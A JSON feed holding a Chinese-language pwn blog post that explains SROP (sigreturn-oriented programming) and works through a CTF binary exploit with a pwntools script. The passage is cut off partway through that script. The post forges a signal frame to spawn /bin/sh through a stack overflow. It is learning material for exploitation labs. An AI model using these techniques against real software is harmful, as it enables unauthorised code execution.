{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"rop\" tag",
    "description": "欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/08/03/srop/",
            "url": "http://example.com/2023/08/03/srop/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<h2 id=\"srop原理\"><a class=\"markdownIt-Anchor\" href=\"#srop原理\">#</a> srop 原理</h2>\n<h3 id=\"signal-机制\"><a class=\"markdownIt-Anchor\" href=\"#signal-机制\">#</a> signal 机制 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jc2lnbmFs\">¶</span></h3>\n<p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>\n<p><img data-src=\"/img/srop/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>\n<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。** 需要注意的是，这一部分是在用户进程的地址空间的。** 之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>\n</ol>\n<p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</p>\n<ul>\n<li>x86</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> __gsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> __fsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> __esh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> __dsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>x64</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __uint16_t        cwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __uint16_t        swd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __uint16_t        ftw<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __uint16_t        fop<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __uint64_t        rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __uint64_t        rdp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __uint32_t        mxcsr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __uint32_t        mxcr_mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpxreg</span>    _st<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_xmmreg</span>    _xmm<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __uint32_t        padding<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __uint64_t r8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __uint64_t r9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __uint64_t r10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __uint64_t r11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __uint64_t r12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __uint64_t r13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  __uint64_t r14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  __uint64_t r15<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  __uint64_t rdi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  __uint64_t rsi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  __uint64_t rbp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  __uint64_t rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  __uint64_t rdx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  __uint64_t rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  __uint64_t rcx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  __uint64_t rsp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  __uint64_t rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  __uint64_t eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> __pad0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  __uint64_t err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  __uint64_t trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  __uint64_t oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  __uint64_t cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  __extension__ <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，**32 位的 sigreturn 的调用号为 <u>119(0x77)</u>，64 位的系统调用号为 <u>15(0xf)</u></li>\n</ol>\n<h2 id=\"攻击原理\"><a class=\"markdownIt-Anchor\" href=\"#攻击原理\">#</a> 攻击原理</h2>\n<p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>\n<ul>\n<li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li>\n<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>\n</ul>\n<h3 id=\"获取-shell\"><a class=\"markdownIt-Anchor\" href=\"#获取-shell\">#</a> 获取 shell</h3>\n<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p>\n<p><img data-src=\"/img/srop/srop-example-1.png\" alt=\"signal2-stack\"></p>\n<p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。___(相当于还原我们调好的寄存器的值)</p>\n<h3 id=\"system-call-chains\"><a class=\"markdownIt-Anchor\" href=\"#system-call-chains\">#</a> system call chains</h3>\n<p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>\n<ul>\n<li><strong>控制栈指针。</strong></li>\n<li><strong>把原来 rip 指向的 <code>syscall</code>  gadget 换成 <code>syscall; ret</code>  gadget。</strong></li>\n</ul>\n<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>\n<p><img data-src=\"/img/srop/srop-example-2.png\" alt=\"signal2-stack\"></p>\n<h3 id=\"后续\"><a class=\"markdownIt-Anchor\" href=\"#后续\">#</a> 后续 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jXzM=\">¶</span></h3>\n<p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>\n<ul>\n<li><strong>可以通过栈溢出来控制栈的内容</strong></li>\n<li>需要知道相应的 **<u>地址</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>需要有够大的空间来塞下整个 sigal frame</li>\n</ul>\n<p>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：</p>\n<h2 id=\"一道例题\"><a class=\"markdownIt-Anchor\" href=\"#一道例题\">#</a> 一道例题</h2>\n<h3 id=\"检查\"><a class=\"markdownIt-Anchor\" href=\"#检查\">#</a> 检查</h3>\n<p><img data-src=\"/img/srop/image-20230803220602093.png\" alt=\"image-20230803220602093\"></p>\n<p><img data-src=\"/img/srop/image-20230803220635434.png\" alt=\"image-20230803220635434\"></p>\n<p>发现输入很少字符，程序就崩溃。堆栈不可执行。</p>\n<h3 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h3>\n<p><img data-src=\"/img/srop/image-20230803220825554.png\" alt=\"image-20230803220825554\"></p>\n<p><img data-src=\"/img/srop/image-20230803220903459.png\" alt=\"image-20230803220903459\"></p>\n<p><img data-src=\"/img/srop/image-20230803220926236.png\" alt=\"image-20230803220926236\"></p>\n<p>mian 函数进入 vuln，很容易发现 vuln 函数调用 sys_read 和 sys_write 系统调用函数。其中在 buf 中有漏洞点。并发现 gadgets 中有</p>\n<pre><code class=\"language-commonlisp\"># 00000000004004DA                 mov     rax, 0Fh\n</code></pre>\n<p>所以很明显可以进行 srop。</p>\n<p>srop 达成攻击的条件是一下内容：</p>\n<ul>\n<li><strong>可以通过栈溢出来控制栈的内容</strong></li>\n<li>需要知道相应的 **<u>地址</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>需要有够大的空间来塞下整个 sigal frame</li>\n</ul>\n<p>检查字符串并没有 binsh，所以我们可以用 sys_read 读入，去泄露栈的基址，然后去计算 binsh 在栈中的偏移。因为虽然程序远程和本地加载不同，但是 bin/sh 读入的偏移是相同的。根据这个原理，我们去计算本地调试的 /bin/sh 的偏移</p>\n<p>但这题我们并不知的去如何泄露栈的基址，那该咋办。凡事先调试再说。</p>\n<p>main 函数之前记录 rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222622304.png\" alt=\"image-20230803222622304\"></p>\n<p>输入 /bin/sh 记录 rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222733528.png\" alt=\"image-20230803222733528\"></p>\n<p>从 rsi 中，我们能得到 bin/sh 在栈中的偏移 —— 0x7fffffffddf8 - 0x7fffffffdce0</p>\n<p><img data-src=\"/img/srop/image-20230803223305868.png\" alt=\"image-20230803223305868\"></p>\n<p>从这里我们就能发现 ——write 打印出 0x30 个字节，可以看出从低地址开始打印 0x20 个字节后 0x8 就是栈基址</p>\n<p>所以通过 write 函数能打印出 libc 栈基址</p>\n<p>打印完栈基址我们就能通过偏移计算出 binsh 的基址了。</p>\n<p>思路有了，直接上 exp</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r = remote('node2.anna.nssctf.cn',28450)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./PWN3')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/f145h/Desktop/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'F145H'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x4004ED</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输/bin/sh之前======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输/bin/sh之后======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>of <span class=\"token operator\">=</span> <span class=\"token number\">0x7fffffffde28</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdd10</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token string\">'of 计算binsh在栈的偏移'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>l_stack <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>binsh <span class=\"token operator\">=</span> l_stack <span class=\"token operator\">-</span> of</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>l_stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'binsh_addr=======>'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400501</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\"># 00000000004004DA                 mov     rax, 0Fh</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sigreturn  <span class=\"token operator\">=</span> <span class=\"token number\">0x4004DA</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sigframe<span 